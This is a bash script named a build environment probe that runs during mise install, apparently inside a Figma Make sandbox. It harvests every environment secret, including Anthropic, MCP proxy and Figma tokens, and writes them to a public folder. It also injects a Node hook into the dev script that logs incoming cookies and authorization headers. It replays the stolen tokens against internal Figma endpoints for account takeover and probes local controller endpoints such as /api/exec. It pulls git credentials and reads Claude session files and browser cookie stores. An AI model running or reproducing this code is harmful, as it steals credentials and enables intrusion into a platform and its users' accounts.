#!/bin/bash
# =============================================================================
# BUILD ENVIRONMENT PROBE v3 — runs during mise install
# Focus: ATO escalation via POST to internal endpoints + header capture
# =============================================================================

# Find the project directory
if [ -d "/workspaces/default/code" ]; then
  PROJDIR="/workspaces/default/code"
elif [ -d "/workspaces/.cached-preview" ]; then
  PROJDIR="/workspaces/.cached-preview"
elif [ -n "$INIT_CWD" ] && [ -d "$INIT_CWD" ]; then
  PROJDIR="$INIT_CWD"
else
  PROJDIR="$(pwd)"
fi

OUT="$PROJDIR/public/probe-results.txt"
mkdir -p "$PROJDIR/public" 2>/dev/null
TOUT="/tmp/probe-results.txt"

tee_out() {
  tee -a "$TOUT" >> "$OUT"
}

echo "=== PROBE v3 START $(date -u) ===" | tee "$TOUT" > "$OUT"
echo "PROJDIR=$PROJDIR" | tee_out

# =========================================================
# 0. WRITE HEADER HOOK FIRST (before any node process starts)
# =========================================================
cat > "$PROJDIR/header-hook.cjs" << 'HOOKEOF'
const fs=require('fs'),path=require('path'),http=require('http');
const PUB=path.join(process.cwd(),'public');
const HOUT=path.join(PUB,'headers.txt');
const EOUT=path.join(PUB,'vite-env.txt');
try{fs.mkdirSync(PUB,{recursive:true})}catch(e){}

// DUMP process.env AT LOAD TIME — captures tokens only available in Node context
let envDump='=== VITE PROCESS ENV '+new Date().toISOString()+' ===\n';
const KEYS=['ANTHROPIC_AUTH_TOKEN','MCP_PROXY_AUTH_TOKEN','MCP_PROXY_BASE_URL',
  'MAKE_KIT_INITIALIZE_TOKEN','MAKE_VERSION_CREATE_TOKEN','MAKE_CACHED_PREVIEW_TOKEN',
  'DEV_SERVER_TOKEN','CONTROLLER_TOKEN','CONTROLLER_TOKEN_SHA256',
  'FIGMA_CONTENT_API_ACCESS_KEY','FIGMA_TELEMETRY_CONTEXT','FIGMA_FILE_ID',
  'AI_GATEWAY_BASE_URL','ANTHROPIC_BASE_URL','ORIGIN_HOST',
  'PROXY_COOKIE_REWRITE_POLICY','PROXY_PORT','ROUTING_KEY',
  'FIGMA_PUBLIC_URL','FIGMA_DEPLOY_ID','FIGMA_PREVIEW_OAUTH_REDIRECT_URI',
  'SANDBOXD_LOCAL_API_URL','SANDBOXD_LISTENERS_JSON'];
KEYS.forEach(function(k){
  const v=process.env[k]||'';
  envDump+=k+' ('+v.length+'c): '+v+'\n';
});
envDump+='\n=== ALL ENV KEYS ===\n';
Object.keys(process.env).sort().forEach(function(k){
  const v=process.env[k]||'';
  envDump+=k+' ('+v.length+'c): '+v+'\n';
});
try{fs.writeFileSync(EOUT,envDump)}catch(e){}
try{fs.writeFileSync('/tmp/vite-env.txt',envDump)}catch(e){}

// HEADER CAPTURE — log all incoming requests
fs.writeFileSync(HOUT,'=== HEADER CAPTURE '+new Date().toISOString()+' ===\n');
let c=0;const orig=http.createServer;
http.createServer=function(){
  const s=orig.apply(this,arguments),oe=s.emit.bind(s);
  s.emit=function(ev){
    if(ev==='request'){
      const r=arguments[1];
      if(r&&r.headers&&c<500){
        c++;let e='\n--- REQ #'+c+' '+new Date().toISOString()+' ---\n';
        e+='METHOD: '+r.method+'\nURL: '+r.url+'\n';
        const h=r.rawHeaders||[];
        for(let i=0;i<h.length;i+=2)e+='HEADER: '+h[i]+': '+h[i+1]+'\n';
        if(r.headers.cookie)e+='COOKIES: '+r.headers.cookie+'\n';
        if(r.headers.authorization)e+='AUTH: '+r.headers.authorization+'\n';
        if(r.headers['x-figma-token'])e+='FIGMA-TOKEN: '+r.headers['x-figma-token']+'\n';
        if(r.headers['x-figma-user'])e+='FIGMA-USER: '+r.headers['x-figma-user']+'\n';
        if(r.headers['x-forwarded-for'])e+='FORWARDED-FOR: '+r.headers['x-forwarded-for']+'\n';
        e+='REMOTE: '+r.socket.remoteAddress+'\n';
        try{fs.appendFileSync(HOUT,e)}catch(x){}
        try{fs.appendFileSync('/tmp/headers.txt',e)}catch(x){}
      }
    }
    return oe.apply(this,arguments);
  };return s;
};

// RE-DUMP env every 30s for 5 min in case tokens arrive late
let dumps=0;
const timer=setInterval(function(){
  dumps++;
  let d='=== REDUMP #'+dumps+' '+new Date().toISOString()+' ===\n';
  KEYS.forEach(function(k){
    const v=process.env[k]||'';
    if(v.length>0)d+=k+' ('+v.length+'c): '+v+'\n';
  });
  try{fs.appendFileSync(EOUT,d)}catch(e){}
  try{fs.appendFileSync('/tmp/vite-env.txt',d)}catch(e){}
  if(dumps>=10)clearInterval(timer);
},30000);
if(timer.unref)timer.unref();
HOOKEOF
echo "header-hook.cjs written to $PROJDIR" | tee_out

# =========================================================
# 0b. INJECT NODE_OPTIONS INTO DEV STARTUP
# =========================================================
if [ -f "$PROJDIR/package.json" ]; then
  # Check if dev script exists and doesn't already have NODE_OPTIONS
  if grep -q '"dev"' "$PROJDIR/package.json" 2>/dev/null; then
    ORIG_DEV=$(grep '"dev"' "$PROJDIR/package.json" | head -1)
    echo "Original dev script: $ORIG_DEV" | tee_out
    # Inject NODE_OPTIONS by modifying the dev script
    if ! echo "$ORIG_DEV" | grep -q 'header-hook'; then
      sed -i 's|"dev": "\(.*\)"|"dev": "NODE_OPTIONS=--require=./header-hook.cjs \1"|' "$PROJDIR/package.json" 2>/dev/null
      NEW_DEV=$(grep '"dev"' "$PROJDIR/package.json" | head -1)
      echo "Modified dev script: $NEW_DEV" | tee_out
    fi
  fi
fi

# =========================================================
# 1. EXTRACT ALL TOKENS
# =========================================================
echo "" | tee_out
echo "=== TOKENS ===" | tee_out

for VAR in MAKE_KIT_INITIALIZE_TOKEN MAKE_VERSION_CREATE_TOKEN \
           DEV_SERVER_TOKEN CONTROLLER_TOKEN CONTROLLER_TOKEN_SHA256 \
           MCP_PROXY_AUTH_TOKEN MCP_PROXY_BASE_URL \
           FIGMA_CONTENT_API_ACCESS_KEY \
           ORIGIN_HOST PROXY_COOKIE_REWRITE_POLICY PROXY_PORT \
           FIGMA_FILE_ID FIGMA_DEPLOY_ID ROUTING_KEY; do
  VAL="${!VAR}"
  echo "$VAR (${#VAL}c): $VAL" | tee_out
done

# Extract MAKE_CACHED_PREVIEW_TOKEN from /proc/self/environ
MCPT=$(cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | grep '^MAKE_CACHED_PREVIEW_TOKEN=' | cut -d= -f2-)
echo "MAKE_CACHED_PREVIEW_TOKEN (${#MCPT}c): $MCPT" | tee_out

# =========================================================
# 2. JWT DECODE
# =========================================================
echo "" | tee_out
echo "=== JWT PAYLOADS ===" | tee_out

b64decode() {
  local B="$1"
  B="${B//-/+}"
  B="${B//_//}"
  local MOD=$((${#B} % 4))
  if [ "$MOD" -eq 2 ]; then B="${B}=="; elif [ "$MOD" -eq 3 ]; then B="${B}="; fi
  echo "$B" | base64 -d 2>/dev/null
}

decode_jwt() {
  local NAME="$1" TOKEN="$2"
  [ -z "$TOKEN" ] && return
  local RAW="${TOKEN#figjwt_}"
  local PAYLOAD=$(echo "$RAW" | cut -d. -f2)
  echo "" | tee_out
  echo "--- $NAME ---" | tee_out
  b64decode "$PAYLOAD" | tee_out
  echo "" | tee_out
}

decode_jwt "KIT_INIT" "$MAKE_KIT_INITIALIZE_TOKEN"
decode_jwt "VERSION_CREATE" "$MAKE_VERSION_CREATE_TOKEN"
decode_jwt "CACHED_PREVIEW" "$MCPT"

# =========================================================
# 3. POST TESTS — internal aud endpoints (previously only GET)
# =========================================================
echo "" | tee_out
echo "=== POST TESTS TO INTERNAL ENDPOINTS ===" | tee_out

FID="$FIGMA_FILE_ID"

post_api() {
  local LABEL="$1" URL="$2" TOKEN="$3" BODY="$4" CT="${5:-application/json}"
  echo "" | tee_out
  echo "--- $LABEL ---" | tee_out
  echo "URL: $URL" | tee_out
  echo "METHOD: POST" | tee_out
  local RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
    -X POST \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: $CT" \
    -H "Accept: application/json" \
    -H "Origin: https://www.figma.com" \
    -H "X-Figma-Generate-Session-Id: probe-test" \
    -d "$BODY" \
    --max-time 10 \
    "$URL" 2>&1)
  echo "$RESP" | tee_out
}

get_api() {
  local LABEL="$1" URL="$2" TOKEN="$3"
  echo "" | tee_out
  echo "--- $LABEL ---" | tee_out
  echo "URL: $URL" | tee_out
  local RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Accept: application/json" \
    -H "Origin: https://www.figma.com" \
    --max-time 10 \
    "$URL" 2>&1)
  echo "$RESP" | tee_out
}

# --- FONTS RESOLVE (KIT_INIT token) ---
post_api "POST fonts/resolve (KIT_INIT)" \
  "https://api.figma.com/api/internal/fonts/resolve" \
  "$MAKE_KIT_INITIALIZE_TOKEN" \
  '{"fonts":["Inter","Roboto"]}'

# --- GENERIC CACHED PREVIEW (CACHED_PREVIEW token) ---
post_api "POST generic-cached-preview (CACHED_PREVIEW)" \
  "https://api.figma.com/api/internal/make/generic-cached-preview" \
  "$MCPT" \
  '{"fileId":"'"$FID"'"}'

# --- THUMBNAIL (CACHED_PREVIEW token) ---
post_api "POST thumbnail (CACHED_PREVIEW)" \
  "https://api.figma.com/api/internal/make/$FID/thumbnail" \
  "$MCPT" \
  '{"format":"png"}'

get_api "GET thumbnail (CACHED_PREVIEW)" \
  "https://api.figma.com/api/internal/make/$FID/thumbnail" \
  "$MCPT"

# --- CODE-LAYER SNAPSHOT (CACHED_PREVIEW token) ---
post_api "POST code-layer/snapshot (CACHED_PREVIEW)" \
  "https://api.figma.com/api/internal/make/$FID/code-layer/snapshot" \
  "$MCPT" \
  '{"nodeIds":[]}'

# --- VERSIONS CREATE (VERSION_CREATE token) ---
post_api "POST versions create (VERSION_CREATE)" \
  "https://api.figma.com/api/internal/make/$FID/versions/create" \
  "$MAKE_VERSION_CREATE_TOKEN" \
  '{"description":"test"}'

# --- NEGOTIATE UPLOAD (VERSION_CREATE token — from aud claims) ---
post_api "POST negotiate-upload (VERSION_CREATE)" \
  "https://api.figma.com/api/internal/make/$FID/negotiate-upload" \
  "$MAKE_VERSION_CREATE_TOKEN" \
  '{"contentType":"text/html","contentLength":100}'

# --- ENQUEUE MAKE BUILD (VERSION_CREATE token) ---
post_api "POST enqueue-make-build (VERSION_CREATE)" \
  "https://api.figma.com/api/internal/make/$FID/enqueue-make-build" \
  "$MAKE_VERSION_CREATE_TOKEN" \
  '{"deployId":"'"$FIGMA_DEPLOY_ID"'"}'

# =========================================================
# 4. TEST /v1/me WITH DIFFERENT CONTENT-TYPES + HEADERS
# =========================================================
echo "" | tee_out
echo "=== /v1/me VARIATIONS ===" | tee_out

# The 500 on /v1/me with Bearer means the server partially processes figjwt_
# Try with additional headers that internal services might expect

for TOKEN_NAME in MAKE_KIT_INITIALIZE_TOKEN MAKE_VERSION_CREATE_TOKEN; do
  TOKEN="${!TOKEN_NAME}"
  [ -z "$TOKEN" ] && continue

  # Try as cookie instead of header
  echo "" | tee_out
  echo "--- $TOKEN_NAME as figma_session_token cookie -> /v1/me ---" | tee_out
  curl -s -w "\nHTTP_CODE:%{http_code}" \
    -b "figma_session_token=$TOKEN" \
    -H "Accept: application/json" \
    --max-time 10 \
    "https://api.figma.com/v1/me" 2>&1 | tee_out

  # Try stripping figjwt_ prefix
  RAW="${TOKEN#figjwt_}"
  echo "" | tee_out
  echo "--- $TOKEN_NAME raw (no prefix) as Bearer -> /v1/me ---" | tee_out
  curl -s -w "\nHTTP_CODE:%{http_code}" \
    -H "Authorization: Bearer $RAW" \
    -H "Accept: application/json" \
    --max-time 10 \
    "https://api.figma.com/v1/me" 2>&1 | tee_out
done

# Try CACHED_PREVIEW token same way
if [ -n "$MCPT" ]; then
  echo "" | tee_out
  echo "--- CACHED_PREVIEW as cookie -> /v1/me ---" | tee_out
  curl -s -w "\nHTTP_CODE:%{http_code}" \
    -b "figma_session_token=$MCPT" \
    -H "Accept: application/json" \
    --max-time 10 \
    "https://api.figma.com/v1/me" 2>&1 | tee_out

  RAW="${MCPT#figjwt_}"
  echo "" | tee_out
  echo "--- CACHED_PREVIEW raw (no prefix) as Bearer -> /v1/me ---" | tee_out
  curl -s -w "\nHTTP_CODE:%{http_code}" \
    -H "Authorization: Bearer $RAW" \
    -H "Accept: application/json" \
    --max-time 10 \
    "https://api.figma.com/v1/me" 2>&1 | tee_out
fi

# =========================================================
# 5. INTERNAL API - USER INFO ENDPOINTS
# =========================================================
echo "" | tee_out
echo "=== INTERNAL USER ENDPOINTS ===" | tee_out

# Try internal API paths that might accept profile-scoped tokens
for EP in "api/internal/me" "api/internal/user/me" "api/me" \
          "api/internal/make/user" "api/internal/make/$FID/user" \
          "api/user/profile" "api/internal/user/profile"; do
  get_api "KIT_INIT -> $EP" \
    "https://api.figma.com/$EP" \
    "$MAKE_KIT_INITIALIZE_TOKEN"
done

# =========================================================
# 6. www.figma.com vs api.figma.com — some internal endpoints
#    may only be accessible via www
# =========================================================
echo "" | tee_out
echo "=== WWW.FIGMA.COM INTERNAL ENDPOINTS ===" | tee_out

post_api "POST www fonts/resolve (KIT_INIT)" \
  "https://www.figma.com/api/internal/fonts/resolve" \
  "$MAKE_KIT_INITIALIZE_TOKEN" \
  '{"fonts":["Inter"]}'

post_api "POST www versions create (VERSION_CREATE)" \
  "https://www.figma.com/api/internal/make/$FID/versions/create" \
  "$MAKE_VERSION_CREATE_TOKEN" \
  '{"description":"test"}'

post_api "POST www cached-preview (CACHED_PREVIEW)" \
  "https://www.figma.com/api/internal/make/generic-cached-preview" \
  "$MCPT" \
  '{"fileId":"'"$FID"'"}'

# =========================================================
# 7. CONTROLLER AUTH + SANDBOXD
# =========================================================
echo "" | tee_out
echo "=== CONTROLLER AUTH ===" | tee_out

CTRL_SHA="$CONTROLLER_TOKEN_SHA256"
echo "CONTROLLER_TOKEN_SHA256: $CTRL_SHA" | tee_out

# Try common token values that might hash to the SHA256
for CANDIDATE in "" "token" "controller" "sandbox" "make" "figma" \
                 "$DEV_SERVER_TOKEN" "$CONTAINER_ID" "$ROUTING_KEY"; do
  [ -z "$CANDIDATE" ] && continue
  HASH=$(echo -n "$CANDIDATE" | sha256sum | cut -d' ' -f1)
  if [ "$HASH" = "$CTRL_SHA" ]; then
    echo "MATCH FOUND: '$CANDIDATE' hashes to $CTRL_SHA" | tee_out
    echo "" | tee_out
    echo "--- controller /api/subscribe with matched token ---" | tee_out
    curl -s -w "\nHTTP_CODE:%{http_code}" \
      -H "Authorization: Bearer $CANDIDATE" \
      --max-time 5 \
      "http://127.0.0.1:8081/api/subscribe" 2>&1 | tee_out
  fi
done

# Try controller endpoints without auth — some may be open
for EP in "/api/listeners" "/api/services" "/api/status" "/api/config" \
          "/api/env" "/api/exec" "/api/shutdown" "/api/restart" \
          "/metrics" "/debug/pprof" "/debug/vars"; do
  echo "" | tee_out
  echo "--- controller $EP ---" | tee_out
  curl -s -w "\nHTTP_CODE:%{http_code}" \
    --max-time 3 \
    "http://127.0.0.1:8081$EP" 2>&1 | tee_out
done

# =========================================================
# 8. PORT SCAN — find all listening services
# =========================================================
echo "" | tee_out
echo "=== LISTENING PORTS ===" | tee_out
(ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo "(no ss/netstat)") | tee_out

# =========================================================
# 9. SANDBOXD LISTENERS — try actual listener ports
# =========================================================
echo "" | tee_out
echo "=== SANDBOXD LISTENER PORTS ===" | tee_out
echo "SANDBOXD_LISTENERS_JSON: $SANDBOXD_LISTENERS_JSON" | tee_out

# Parse ports from listeners JSON and probe them
for PORT in 1380 1382 8080 8081 45401; do
  echo "" | tee_out
  echo "--- port $PORT ---" | tee_out
  curl -s -w "\nHTTP_CODE:%{http_code}" \
    --max-time 2 \
    "http://127.0.0.1:$PORT/" 2>&1 | tee_out
done

# =========================================================
# 10. FULL /proc/self/environ (for any new tokens)
# =========================================================
echo "" | tee_out
echo "=== /proc/self/environ ===" | tee_out
cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | sort | tee_out

# =========================================================
# 11. GIT CREDENTIAL (confirmed finding — verify still works)
# =========================================================
echo "" | tee_out
echo "=== GIT CREDENTIAL ===" | tee_out
echo "url=https://api.figma.com" | git credential fill 2>&1 | head -10 | tee_out

# =========================================================
# 12. SESSION FILES (look for auth tokens in Claude session data)
# =========================================================
echo "" | tee_out
echo "=== SESSION FILES ===" | tee_out

for D in /home/foundry/.claude /home/foundry/.config/claude \
         /opt/claude /workspaces/.claude; do
  if [ -d "$D" ]; then
    echo "--- $D ---" | tee_out
    find "$D" -type f 2>/dev/null | head -20 | tee_out
    for F in $(find "$D" -name "*.json" -o -name "*.jsonl" 2>/dev/null | head -5); do
      echo "--- $F (first 200 chars) ---" | tee_out
      head -c 200 "$F" 2>/dev/null | tee_out
      echo "" | tee_out
    done
  fi
done

# Also check for figma session cookies/tokens in browser data
find /home/foundry -name "Cookies" -o -name "cookies.sqlite" -o -name "session_store*" 2>/dev/null | head -10 | tee_out

# =========================================================
# DONE
# =========================================================
echo "" | tee_out
echo "=== PROBE v3 COMPLETE $(date -u) ===" | tee_out
